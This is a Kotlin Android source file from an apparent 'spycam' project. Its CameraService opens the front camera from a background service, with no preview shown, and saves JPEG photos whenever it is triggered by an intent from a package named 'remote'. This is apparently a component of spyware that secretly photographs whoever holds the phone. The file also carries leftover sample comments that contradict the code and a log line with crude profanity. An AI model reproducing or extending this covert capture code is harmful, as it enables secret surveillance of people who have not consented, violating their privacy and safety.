package com.spylab.spycam.remote

import android.Manifest
import android.app.IntentService
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.ImageReader.OnImageAvailableListener
import android.os.Handler
import android.os.HandlerThread
import android.support.v4.content.ContextCompat
import android.util.Log
import android.util.Size
import android.widget.Toast
import android.widget.Toast.LENGTH_SHORT
import com.spylab.spycam.util.ImageSaver
import java.lang.Thread.sleep
import java.util.*
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit


class CameraService : IntentService("CameraService") {
    private val TAG = "CameraService"

    /**
     * Camera state: Showing camera preview.
     */
    private val STATE_PREVIEW = 0

    /**
     * Camera state: Waiting for the focus to be locked.
     */
    private val STATE_WAITING_LOCK = 1

    /**
     * Camera state: Waiting for the exposure to be precapture state.
     */
    private val STATE_WAITING_PRECAPTURE = 2

    /**
     * Camera state: Waiting for the exposure state to be something other than precapture.
     */
    private val STATE_WAITING_NON_PRECAPTURE = 3

    /**
     * Camera state: Picture was taken.
     */
    private val STATE_PICTURE_TAKEN = 4

    /**
     * ID of the current [CameraDevice].
     */
    private var mCameraId: String? = null

    /**
     * A [CameraCaptureSession] for camera preview.
     */
    private var mCaptureSession: CameraCaptureSession? = null

    /**
     * A reference to the opened [CameraDevice].
     */
    private var mCameraDevice: CameraDevice? = null

    private val mStateCallback = object : CameraDevice.StateCallback() {

        override fun onOpened(cameraDevice: CameraDevice) {
            // This method is called when the camera is opened.  We start camera preview here.
            mCameraOpenCloseLock.release()
            mCameraDevice = cameraDevice
            createCameraPreviewSession()

        }

        override fun onDisconnected(cameraDevice: CameraDevice) {
            mCameraOpenCloseLock.release()
            cameraDevice.close()
            mCameraDevice = null
        }

        override fun onError(cameraDevice: CameraDevice, error: Int) {
            mCameraOpenCloseLock.release()
            cameraDevice.close()
            mCameraDevice = null
        }

    }

    /**
     * An additional thread for running tasks that shouldn't block the UI.
     */
    private var mBackgroundThread: HandlerThread? = null

    /**
     * A [Handler] for running tasks in the background.
     */
    private var mBackgroundHandler: Handler? = null

    /**
     * An [ImageReader] that handles still image capture.
     */
    private var mImageReader: ImageReader? = null

    /**
     * This a callback object for the [ImageReader]. "onImageAvailable" will be called when a
     * still image is ready to be saved.
     */
    private val mOnImageAvailableListener = OnImageAvailableListener { reader ->
        mBackgroundHandler!!.post(ImageSaver(reader.acquireNextImage(), this))
        Log.d(TAG, "IMAGE FUCKING SAVED PIDOR BLAD SUKA")
    }

    /**
     * [CaptureRequest.Builder] for the camera preview
     */
    private var mPreviewRequestBuilder: CaptureRequest.Builder? = null

    /**
     * [CaptureRequest] generated by [.mPreviewRequestBuilder]
     */
    private var mPreviewRequest: CaptureRequest? = null


    /**
     * The current state of camera state for taking pictures.
     *
     * @see .mCaptureCallback
     */
    private var mState = STATE_PREVIEW

    /**
     * A [Semaphore] to prevent the app from exiting before closing the camera.
     */
    private val mCameraOpenCloseLock = Semaphore(1)

    /**
     * Orientation of the camera sensor
     */
    private var mSensorOrientation: Int = 0

    /**
     * A [CameraCaptureSession.CaptureCallback] that handles events related to JPEG capture.
     */
    private val mCaptureCallback = object : CameraCaptureSession.CaptureCallback() {

        private fun process(result: CaptureResult) {
            Log.d(TAG, "mCaptureCallback process" + result.toString())
            Log.d(TAG, "mCaptureCallback state" + mState)
            when (mState) {
                STATE_WAITING_LOCK -> {
                    val afState = result.get(CaptureResult.CONTROL_AF_STATE)
                    if (CaptureResult.CONTROL_AF_STATE_FOCUSED_LOCKED == afState || CaptureResult.CONTROL_AF_STATE_NOT_FOCUSED_LOCKED == afState) {
                        // CONTROL_AE_STATE can be null on some devices
                        val aeState = result.get(CaptureResult.CONTROL_AE_STATE)
                        if (aeState == null || aeState == CaptureResult.CONTROL_AE_STATE_CONVERGED) {
                            mState = STATE_PICTURE_TAKEN
                        } else {
                            runPrecaptureSequence()
                        }
                    }
                }
            }
        }

        override fun onCaptureProgressed(session: CameraCaptureSession,
                                         request: CaptureRequest,
                                         partialResult: CaptureResult) {
            process(partialResult)
        }

        override fun onCaptureCompleted(session: CameraCaptureSession,
                                        request: CaptureRequest,
                                        result: TotalCaptureResult) {
            process(result)
        }

    }

    override fun onHandleIntent(intent: Intent?) {
        Log.d(TAG, "onHandleIntent")
        startBackgroundThread()
        takePicture()
    }

    /**
     * Opens the camera specified by [Camera2BasicFragment.mCameraId].
     */
    private fun openCamera(width: Int, height: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
//            requestCameraPermission()
            return
        }
        Log.d(TAG, "openCamera")

        setUpCameraOutputs(width, height)
        val manager = this.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            if (!mCameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
                throw RuntimeException("Time out waiting to lock camera opening.")
            }
            manager.openCamera(mCameraId, mStateCallback, mBackgroundHandler)
            Log.d(TAG, "manager openCamera")

        } catch (e: CameraAccessException) {
            e.printStackTrace()
        } catch (e: InterruptedException) {
            throw RuntimeException("Interrupted while trying to lock camera opening.", e)
        }

    }

    /**
     * Closes the current [CameraDevice].
     */
    private fun closeCamera() {
        try {
            mCameraOpenCloseLock.acquire()
            mCaptureSession?.close()
            mCaptureSession = null
            mCameraDevice?.close()
            mCameraDevice = null
            mImageReader?.close()
            mImageReader = null
        } catch (e: InterruptedException) {
            throw RuntimeException("Interrupted while trying to lock camera closing.", e)
        } finally {
            mCameraOpenCloseLock.release()
        }
    }


    /**
     * Starts a background thread and its [Handler].
     */
    private fun startBackgroundThread() {
        mBackgroundThread = HandlerThread("CameraBackground")
        mBackgroundThread!!.start()
        mBackgroundHandler = Handler(mBackgroundThread!!.looper)
    }

    /**
     * Stops the background thread and its [Handler].
     */
    private fun stopBackgroundThread() {
        mBackgroundThread!!.quitSafely()
        try {
            mBackgroundThread!!.join()
            mBackgroundThread = null
            mBackgroundHandler = null
        } catch (e: InterruptedException) {
            e.printStackTrace()
        }

    }

    /**
     * Creates a new [CameraCaptureSession] for camera preview.
     */
    private fun createCameraPreviewSession() {
        try {
            Log.d(TAG, "createCameraPreviewSession " + mCameraDevice)
            // We set up a CaptureRequest.Builder with the output Surface.
            mPreviewRequestBuilder = mCameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            mPreviewRequestBuilder?.addTarget(mImageReader?.surface)
            mPreviewRequestBuilder?.set(CaptureRequest.JPEG_ORIENTATION, mSensorOrientation)
//
            Log.d(TAG, "createCameraPreviewSession " + mImageReader)
            Log.d(TAG, "createCameraPreviewSession " + mImageReader?.surface)

//            // Here, we create a CameraCaptureSession for camera preview.
            mCameraDevice?.createCaptureSession(Arrays.asList(mImageReader?.surface),
                    object : CameraCaptureSession.StateCallback() {

                        override fun onReady(session: CameraCaptureSession?) {
                            super.onReady(session)
                            Log.d(TAG, "createCameraPreviewSession onReady")

                        }

                        override fun onConfigured(cameraCaptureSession: CameraCaptureSession) {
                            // The camera is already closed
                            if (null == mCameraDevice) {
                                return
                            }

                            // When the session is ready, we start displaying the preview.
                            mCaptureSession = cameraCaptureSession
                            try {
                                // Finally, we start displaying the camera preview.
//                                mPreviewRequest = mPreviewRequestBuilder?.build()
//                                mCaptureSession?.setRepeatingRequest(mPreviewRequest,
//                                        mCaptureCallback, mBackgroundHandler)
                                Log.d(TAG, "createCameraPreviewSession " + mPreviewRequest)
                                Log.d(TAG, "createCameraPreviewSession " + mCaptureSession)
                                lockFocus()
                                Handler().postDelayed(Runnable {
                                    lockFocus()
                                    sleep(1000)
                                    lockFocus()
//                                    sleep(2000)
//                                    closeCamera()
//                                    stopBackgroundThread()
                                }, 1000)
                            } catch (e: CameraAccessException) {
                                Log.e(TAG, "err: " + e.message)
                            } catch (e: InterruptedException) {
                                Log.e(TAG, "err: " + e.message)
                            }

                        }

                        override fun onConfigureFailed(
                                cameraCaptureSession: CameraCaptureSession) {
                            Toast.makeText(this@CameraService, "onConfigureFailed", LENGTH_SHORT).show()
                        }
                    }, null
            )
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }


    /**
     * Sets up member variables related to camera.
     *
     * @param width  The width of available size for camera preview
     * @param height The height of available size for camera preview
     */
    private fun setUpCameraOutputs(width: Int, height: Int) {
        val manager = this.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            for (cameraId in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(cameraId)

                // We don't use a front facing camera in this sample.
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == null || facing != CameraCharacteristics.LENS_FACING_FRONT) {
                    continue
                }
                mCameraId = cameraId

                val map = characteristics.get(
                        CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: continue

                // For still image captures, we use the largest available size.
                val largest = Collections.max(
                        Arrays.asList(*map.getOutputSizes(ImageFormat.JPEG)),
                        CompareSizesByArea())
                mSensorOrientation = manager.getCameraCharacteristics(mCameraId).get(
                        CameraCharacteristics.SENSOR_ORIENTATION)
                mImageReader = ImageReader.newInstance(largest.width, largest.height,
                        ImageFormat.JPEG, /*maxImages*/2)
                mImageReader?.setOnImageAvailableListener(
                        mOnImageAvailableListener, mBackgroundHandler)

                return
            }
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }

    }

    /**
     * Unlock the focus. This method should be called when still image capture sequence is
     * finished.
     */
    private fun unlockFocus() {
        try {
            // Reset the auto-focus trigger

            // After this, the camera will go back to the normal state of preview.
            mState = STATE_PREVIEW
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }

    }

    /**
     * Initiate a still image capture.
     */
    private fun takePicture() {
        openCamera(1920, 1080)
    }

    /**
     * Lock the focus as the first step for a still image capture.
     */
    private fun lockFocus() {
        try {
            Log.d(TAG, "lockFocus")

            // This is how to tell the camera to lock focus.
            mPreviewRequestBuilder?.set(CaptureRequest.CONTROL_AF_TRIGGER,
                    CameraMetadata.CONTROL_AF_TRIGGER_START)
            // Tell #mCaptureCallback to wait for the lock.
            Log.d(TAG, "lockFocus " + mState)

            mState = STATE_WAITING_LOCK
            Log.d(TAG, "lockFocus " + mPreviewRequestBuilder)
            Log.d(TAG, "lockFocus " + mCaptureSession)

            mCaptureSession?.capture(mPreviewRequestBuilder?.build(), mCaptureCallback,
                    mBackgroundHandler)
            Log.d(TAG, "lockFocus " + mState)

        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }

    }


    /**
     * Run the precapture sequence for capturing a still image. This method should be called when
     * we get a response in [.mCaptureCallback] from [.lockFocus].
     */
    private fun runPrecaptureSequence() {
        try {
            // This is how to tell the camera to trigger.
            mPreviewRequestBuilder?.set(CaptureRequest.CONTROL_AE_PRECAPTURE_TRIGGER,
                    CaptureRequest.CONTROL_AE_PRECAPTURE_TRIGGER_START)
            // Tell #mCaptureCallback to wait for the precapture sequence to be set.
            mState = STATE_WAITING_PRECAPTURE
            mCaptureSession?.capture(mPreviewRequestBuilder?.build(), mCaptureCallback,
                    mBackgroundHandler)
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }

    }

    /**
     * Compares two `Size`s based on their areas.
     */
    internal class CompareSizesByArea : Comparator<Size> {

        override fun compare(lhs: Size, rhs: Size): Int {
            // We cast here to ensure the multiplications won't overflow
            return java.lang.Long.signum(lhs.width.toLong() * lhs.height - rhs.width.toLong() * rhs.height)
        }

    }
}